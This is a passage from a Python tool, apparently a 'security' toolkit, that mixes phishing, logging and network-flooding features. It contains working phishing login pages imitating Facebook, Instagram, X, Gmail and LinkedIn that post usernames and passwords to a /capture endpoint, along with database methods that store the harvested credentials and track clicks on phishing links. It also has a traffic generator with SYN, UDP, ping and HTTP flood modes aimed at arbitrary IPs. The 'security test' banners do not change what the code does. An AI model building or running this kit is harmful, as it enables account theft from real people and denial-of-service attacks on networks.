            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #166fe5;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>facebook</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
            <div class="warning">
                ⚠️ Security test page - Do not use real credentials
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-family: 'Billabong', cursive;
            font-size: 50px;
            margin: 0;
            color: #262626;
        }
        .form-group {
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 9px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 7px 16px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Instagram</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
            <div class="warning">
                ⚠️ Security test page - Do not use real credentials
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body {
            font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1DA1F2 0%, #0d8bda 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #ffffff;
        }
        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: #000000;
            border-radius: 16px;
            padding: 48px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-size: 40px;
            margin: 0;
            color: #e7e9ea;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            background-color: #000000;
            border: 1px solid #2f3336;
            border-radius: 4px;
            color: #e7e9ea;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #1d9bf0;
            color: white;
            border: none;
            border-radius: 9999px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #1a8cd8;
        }
        .warning {
            margin-top: 20px;
            padding: 12px;
            background-color: #1a1a1a;
            border: 1px solid #2f3336;
            border-radius: 8px;
            color: #e7e9ea;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>𝕏</h1>
                <h2>Sign in to X</h2>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone, email, or username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Next</button>
            </form>
            <div class="warning">
                ⚠️ Security test page - Do not use real credentials
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #4285F4 0%, #34A853 50%, #FBBC05 75%, #EA4335 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 28px;
            padding: 48px 40px 36px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #1a73e8;
            font-size: 24px;
            margin: 10px 0 0;
        }
        h2 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 13px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #1b66c9;
        }
        .warning {
            margin-top: 30px;
            padding: 12px;
            background-color: #e8f0fe;
            border: 1px solid #d2e3fc;
            border-radius: 8px;
            color: #202124;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Gmail</h1>
            </div>
            <h2>Sign in</h2>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Next</button>
            </form>
            <div class="warning">
                ⚠️ Security test page - Do not use real credentials
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0077B5 0%, #00A0DC 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            padding: 40px 32px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo h1 {
            color: #0a66c2;
            font-size: 32px;
            margin: 0;
        }
        h2 {
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 8px;
            color: #000000;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #666666;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #0a66c2;
            color: white;
            border: none;
            border-radius: 28px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background-color: #004182;
        }
        .warning {
            margin-top: 24px;
            padding: 12px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>LinkedIn</h1>
            </div>
            <h2>Sign in</h2>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign in</button>
            </form>
            <div class="warning">
                ⚠️ Security test page - Do not use real credentials
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        """Log time/date command"""
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result, timestamp)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            logger.info(f"Threat logged: {alert.threat_type} from {alert.source_ip}")
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_scan(self, scan_result: ScanResult):
        """Log scan results"""
        try:
            open_ports_json = json.dumps(scan_result.open_ports) if scan_result.open_ports else "[]"
            vulnerabilities_json = json.dumps(scan_result.vulnerabilities) if scan_result.vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, vulnerabilities, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (scan_result.target, scan_result.scan_type, open_ports_json, 
                  vulnerabilities_json, scan_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_nikto_scan(self, nikto_result: NiktoResult):
        """Log Nikto scan results"""
        try:
            vulnerabilities_json = json.dumps(nikto_result.vulnerabilities) if nikto_result.vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (nikto_result.target, vulnerabilities_json, nikto_result.output_file,
                  nikto_result.scan_time, nikto_result.success, nikto_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def log_traffic(self, traffic: TrafficGenerator, executed_by: str = "system"):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic.traffic_type, traffic.target_ip, traffic.target_port,
                  traffic.duration, traffic.packets_sent, traffic.bytes_sent,
                  traffic.status, executed_by, traffic.error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def log_connection(self, local_ip: str, local_port: int, remote_ip: str, 
                      remote_port: int, protocol: str, status: str):
        """Log network connection"""
        try:
            self.cursor.execute('''
                INSERT INTO network_connections (local_ip, local_port, remote_ip, remote_port, protocol, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (local_ip, local_port, remote_ip, remote_port, protocol, status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log connection: {e}")
    
    def create_session(self, user_name: str = None) -> str:
        """Create new user session"""
        try:
            session_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO user_sessions (session_id, user_name)
                VALUES (?, ?)
            ''', (session_id, user_name))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session activity"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET last_activity = CURRENT_TIMESTAMP, 
                    commands_count = commands_count + 1
                WHERE session_id = ? AND active = 1
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def end_session(self, session_id: str):
        """End user session"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET active = 0, last_activity = CURRENT_TIMESTAMP
                WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes, added_date)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        """Remove IP from management"""
        try:
            self.cursor.execute('''
                DELETE FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock IP"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                self.cursor.execute('''
                    SELECT * FROM managed_ips ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        """Get information about a specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_threats_by_ip(self, ip: str, limit: int = 10) -> List[Dict]:
        """Get threats for specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats 
                WHERE source_ip = ? 
                ORDER BY timestamp DESC LIMIT ?
            ''', (ip, limit))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats by IP: {e}")
            return []
    
    def get_traffic_logs(self, limit: int = 20) -> List[Dict]:
        """Get recent traffic generation logs"""
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        """Get recent Nikto scans"""
        try:
            self.cursor.execute('''
                SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_time_history(self, limit: int = 20) -> List[Dict]:
        """Get time/date command history"""
        try:
            self.cursor.execute('''
                SELECT command, user, result, timestamp FROM time_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get time history: {e}")
            return []
    
    def get_sessions(self, active_only: bool = True) -> List[Dict]:
        """Get user sessions"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM user_sessions WHERE active = 1 ORDER BY start_time DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM user_sessions ORDER BY start_time DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM time_history')
            stats['total_time_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM wordlist_generations')
            stats['total_wordlist_generations'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM user_sessions WHERE active = 1')
            stats['active_sessions'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, created_at, clicks, qr_code_path)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.original_url, link.phishing_url, link.template,
                  link.created_at, link.clicks, None))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_links ORDER BY created_at DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        """Get phishing link by ID"""
        try:
            self.cursor.execute('''
                SELECT * FROM phishing_links WHERE id = ?
            ''', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        """Update click count for phishing link"""
        try:
            self.cursor.execute('''
                UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?
            ''', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional_data))
            self.conn.commit()
            logger.info(f"Credentials captured for link {link_id} from {ip_address}")
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        """Get phishing templates"""
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name
                ''', (platform,))
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates ORDER BY platform, name
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    def save_phishing_template(self, name: str, platform: str, html_content: str) -> bool:
        """Save phishing template"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO phishing_templates (name, platform, html_content)
                VALUES (?, ?, ?)
            ''', (name, platform, html_content))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing template: {e}")
            return False
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# TIME MANAGER
# =====================
class TimeManager:
    """Time and date management with history tracking"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_current_time(self, full: bool = False) -> str:
        """Get current time"""
        now = datetime.datetime.now()
        timezone = now.astimezone().tzinfo
        
        if full:
            return (f"🕐 Current Time: {now.strftime('%H:%M:%S')} {timezone}\n"
                   f"   Unix Timestamp: {int(time.time())}")
        else:
            return f"🕐 Current Time: {now.strftime('%H:%M:%S')} {timezone}"
    
    def get_current_date(self, full: bool = False) -> str:
        """Get current date"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"   Day of Year: {now.timetuple().tm_yday}\n"
                   f"   Week Number: {now.isocalendar()[1]}")
        else:
            return f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}"
    
    def get_datetime(self, full: bool = False) -> str:
        """Get current date and time"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}\n"
                   f"   Unix Timestamp: {int(time.time())}")
        else:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}")
    
    def get_timezone_info(self) -> str:
        """Get timezone information"""
        now = datetime.datetime.now()
        tz = now.astimezone().tzinfo
        
        return (f"🌍 Timezone: {tz}\n"
               f"   UTC Offset: {now.strftime('%z')}\n"
               f"   DST Active: {bool(now.dst())}")
    
    def get_time_difference(self, time1: str, time2: str) -> str:
        """Calculate time difference"""
        try:
            t1 = datetime.datetime.strptime(time1, "%H:%M:%S")
            t2 = datetime.datetime.strptime(time2, "%H:%M:%S")
            diff = abs((t2 - t1).total_seconds())
            hours = int(diff // 3600)
            minutes = int((diff % 3600) // 60)
            seconds = int(diff % 60)
            return f"⏱️ Time Difference: {hours}h {minutes}m {seconds}s"
        except:
            return "❌ Invalid time format. Use HH:MM:SS"
    
    def get_date_difference(self, date1: str, date2: str) -> str:
        """Calculate date difference"""
        try:
            d1 = datetime.datetime.strptime(date1, "%Y-%m-%d")
            d2 = datetime.datetime.strptime(date2, "%Y-%m-%d")
            diff = abs((d2 - d1).days)
            weeks = diff // 7
            months = diff // 30
            years = diff // 365
            return (f"📅 Date Difference: {diff} days, {weeks} weeks, {months} months, {years} years")
        except:
            return "❌ Invalid date format. Use YYYY-MM-DD"

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    """Real network traffic generator"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.generator_threads = {}
        self.stop_events = {}
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        """Check if we have permission to create raw sockets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        """Get list of available traffic types"""
        available = [
            TrafficType.TCP_CONNECT,
            TrafficType.HTTP_GET,
            TrafficType.HTTP_POST,
            TrafficType.HTTPS,
            TrafficType.DNS
        ]
        
        if self.scapy_available and self.has_raw_socket_permission:
            available.extend([
                TrafficType.ICMP,
                TrafficType.TCP_SYN,
                TrafficType.TCP_ACK,
                TrafficType.UDP,
                TrafficType.ARP,
                TrafficType.PING_FLOOD,
                TrafficType.SYN_FLOOD,
                TrafficType.UDP_FLOOD,
                TrafficType.HTTP_FLOOD,
                TrafficType.MIXED,
                TrafficType.RANDOM
            ])
        
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int, 
                        port: int = None, packet_rate: int = 100, 
                        executed_by: str = "system") -> TrafficGenerator:
        """Generate real traffic to target IP"""
        
        # Validate IP
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        # Set default port based on traffic type
        if port is None:
            if traffic_type in [TrafficType.HTTP_GET, TrafficType.HTTP_POST, TrafficType.HTTP_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.HTTPS:
                port = 443
            elif traffic_type == TrafficType.DNS:
                port = 53
            elif traffic_type in [TrafficType.TCP_SYN, TrafficType.TCP_ACK, TrafficType.TCP_CONNECT, TrafficType.SYN_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.UDP:
                port = 53
            else:
                port = 0
        
        generator = TrafficGenerator(
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_traffic_generator,
            args=(generator_id, generator, packet_rate, stop_event)
        )
        thread.daemon = True
        thread.start()
        
        self.generator_threads[generator_id] = thread
        self.active_generators[generator_id] = generator
        
        self.db.log_connection(
            local_ip=self._get_local_ip(),
            local_port=0,
            remote_ip=target_ip,
            remote_port=port,
            protocol=traffic_type,
            status="initiated"
        )
        
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator, 
                               packet_rate: int, stop_event: threading.Event):
        """Run traffic generator in thread"""
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            
            generator_func = self._get_generator_function(generator.traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    time.sleep(packet_interval)
                except Exception as e:
                    logger.error(f"Traffic generation error: {e}")
                    time.sleep(0.1)
            
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.end_time = datetime.datetime.now().isoformat()
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            
            self.db.log_traffic(generator)
            
        except Exception as e:
            generator.status = "failed"
            generator.error = str(e)
            self.db.log_traffic(generator)
            logger.error(f"Traffic generator failed: {e}")
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        """Get generator function for traffic type"""
        generators = {
            TrafficType.ICMP: self._generate_icmp,
            TrafficType.TCP_SYN: self._generate_tcp_syn,
            TrafficType.TCP_ACK: self._generate_tcp_ack,
